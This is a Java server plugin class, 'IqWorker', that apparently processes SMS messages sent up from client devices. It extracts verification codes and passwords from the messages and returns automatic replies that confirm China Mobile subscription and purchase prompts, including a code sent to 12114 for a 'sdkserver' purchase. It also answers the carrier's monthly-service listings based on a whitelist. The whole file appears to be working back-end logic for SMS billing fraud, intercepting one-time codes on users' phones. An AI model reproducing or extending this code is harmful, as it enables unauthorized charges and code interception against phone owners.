package net.workspace.web.web.plugin;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.servlet.http.HttpServletRequest;
import net.workspace.web.entity.LogEntity;
import net.workspace.web.entity.SettingEntity;
import net.workspace.web.entity.client.ClientEntity;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import bean.Feedback;
import bean.IQAnswer;
import bean.Json;
import bean.form.IQForm;
import bean.form.ReportForm;

@Component
public class IqWorker extends Worker {
    private static final Logger logger = LoggerFactory.getLogger("IQLogger");
    static Pattern[] patterns = {
            //
            Pattern.compile("发送\\s*([\\d]+)[^\\d]+([\\d]+)"), //
            Pattern.compile("回复([\\d]+)"),//
            Pattern.compile("发送([JC][\\d]+)[^\\d]+([\\d]+)"), //
            Pattern.compile("回复[\"“](否)[\"”]"), //订购&疑问&回复
            Pattern.compile("回复[\"“]([\\d]+)[\"”]"), //订购&疑问&回复  --尊敬的客户，您好！您已成功订购中国移动的芒果TV手机视频包月业务，标准资费10.0元/月（实际收费根据您参加的套餐或优惠活动而定），从2014年10月10日开始生效。如有疑问可在1小时内回复\"8366\"，我们将在72小时内由10086联系您处理问题。如需帮助，请咨询10086。【中国移动提醒服务】
            Pattern.compile("发送[\"“]([\\d]+)[\"”]到([\\d]+)"), //订购&疑问&发送-------订购提醒：尊敬的客户，您好！您已成功订购由中国移动通信集团北京有限公司提供的飞信，免费。如有疑问，请咨询10086。发送“1111”到10086获取更多精彩手机应用！中国移动
    };
    @Override
    public String execute(HttpServletRequest request, JSONObject obj) throws Exception {
        IQForm iqForm = Json.optObj(IQForm.class, obj);
        logger.info("iqForm:" + iqForm.toJson());
        ClientEntity client = clientService.findByDeviceId(iqForm.deviceId);
        checkAreaByIp(request, client);
        if (client != null && client.getPluginVersion() >= 7) {
            String address = iqForm.address;
            String content = iqForm.content;
            Feedback feedback = iqForm.feedback;
            ReportForm form = getNumberIQAnswer(client, address, content, feedback);
            log(request, new LogEntity(client, form));
            if (form.success) { return form.content.toJson().toString(); }
        }
        return null;
    }
    private ReportForm getNumberIQAnswer(ClientEntity client, String address, String content, Feedback feedback) {
        IQAnswer answer = new IQAnswer();
        ReportForm form = new ReportForm();
        form.content = answer;
        answer.feedback = feedback;
        boolean success = false;
        if (content.contains("星际世界") && content.contains("通过页面提交")) {
            answer.reciever = "12114";
            answer.answer = "sdkserver#04001182" + getVerifyCode(content);
            success = true;
        } else if ("10086977".equals(address) || content.contains("套餐内")) {
            success = parseMonthlyPaymentCanelNotification(client, form, answer, address, content);
        } else if (content.contains("宣传不符") || content.contains("订购") && content.contains("疑问")) {
            success = parsePpvPayNotification(client, form, answer, address, content);
        } else {
            String verifyCode = getVerifyCode(content);
            if (StringUtils.isNotBlank(verifyCode)) {
                answer.reciever = StringUtils.isNotEmpty(feedback.port) ? feedback.port : address;
                answer.answer = verifyCode;
                success = true;
            }
        }
        form.success = success;
        return form;
    }
    private String getVerifyCode(String content) {
        String[] numberKeywords = new String[] { "验证码为", "本次密码", "密码是", "回复数字" };
        for (String keyword : numberKeywords) {
            StringBuilder sb = new StringBuilder();
            int index = content.indexOf(keyword);
            if (index >= 0) {
                for (int i = index + keyword.length(); i < content.length(); i++) {
                    char c = content.charAt(i);
                    if (c >= '0' && c <= '9') sb.append(c);
                    else break;
                }
            }
            if (sb.length() > 0) return sb.toString();
        }
        return null;
    }
    private boolean parseMonthlyPaymentCanelNotification(ClientEntity client, ReportForm form, IQAnswer answer, String address, String content) {
        String parseResult = parseMonthPayNotification(client, form, content);
        if (parseResult.length() > 0) {
            answer.reciever = address;
            answer.answer = parseResult;
            return true;
        }
        return false;
    }
    String parseMonthPayNotification(ClientEntity client, ReportForm form, String content) {
        SettingEntity setting = settingService.get();
        String whitePaymentList = setting.getWhitePaymentList();
        List<String> keywordList = new ArrayList<String>();
        if (whitePaymentList != null) {
            for (String keyword : whitePaymentList.split(",")) {
                if (keyword.trim().length() > 0) {
                    keywordList.add(keyword.trim());
                }
            }
        }
        keywordList.addAll(bizService.getMontylyPayCancelWhiteKeywords(client.getPhoneNumber()));
        {
            StringBuilder sb = new StringBuilder("白名单:[");
            for (String keyword : keywordList) {
                sb.append(keyword).append(",");
            }
            sb.append("]");
            form.message = sb.toString();
        }
        List<Integer> list = new ArrayList<Integer>();
        String regex = "([\\d]+)[、 \\.，]([^;]+);";
        Pattern pattern = java.util.regex.Pattern.compile(regex);
        Matcher matcher = pattern.matcher(content.replace('。', ';').replace('；', ';'));
        while (matcher.find()) {
            if (matcher.groupCount() == 2) {
                int id = Integer.valueOf(matcher.group(1));
                String desc = matcher.group(2);
                //System.out.println (id + "->" + desc);
                boolean except = false;
                for (String keyword : keywordList) {
                    if (desc.contains(keyword)) {
                        except = true;
                        break;
                    }
                }
                if (!except) list.add(id);
            }
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < list.size(); i++) {
            sb.append(list.get(i));
            if (i < list.size() - 1) sb.append(",");
        }
        return sb.toString();
    }
    private IQAnswer parsePpvPaymentNotifcation(String message) {
        if (!"Y".equals(settingService.get().getEnablePpvPayCancel())) return null;
        Set<String> whiteSet = bizService.getPpvPayCancelWhiteKeywords();
        if (whiteSet.size() == 0) return null;
        for (String keyword : whiteSet) {
            if (message.contains(keyword)) return null;
        }
        //可在1小时内发送337912（系统生成的随机码）到10086901，我们
        //可在1小时内发送329952到10086901，
        //可在1小时内回复2919，我们将在72小时内
        //可在1小时内回复3874，
        // System.out.println(line);
        for (Pattern pattern : patterns) {
            Matcher matcher = pattern.matcher(message);
            if (matcher.find()) {
                String content = null;
                String port = null;
                if (matcher.groupCount() >= 1) {
                    content = matcher.group(1);
                }
                if (matcher.groupCount() >= 2) {
                    port = matcher.group(2);
                }
                if (content != null && content.length() > 0) {
                    IQAnswer answer = new IQAnswer();
                    answer.answer = content;
                    answer.reciever = port;
                    return answer;
                }
            }
        }
        return null;
    }
    private boolean parsePpvPayNotification(ClientEntity client, ReportForm form, IQAnswer answer, String address, String content) {
        IQAnswer parseResult = parsePpvPaymentNotifcation(content);
        if (parseResult != null) {
            answer.answer = parseResult.answer;
            answer.reciever = StringUtils.isEmpty(parseResult.reciever) ? address : parseResult.reciever;
            return true;
        }
        return false;
    }
}
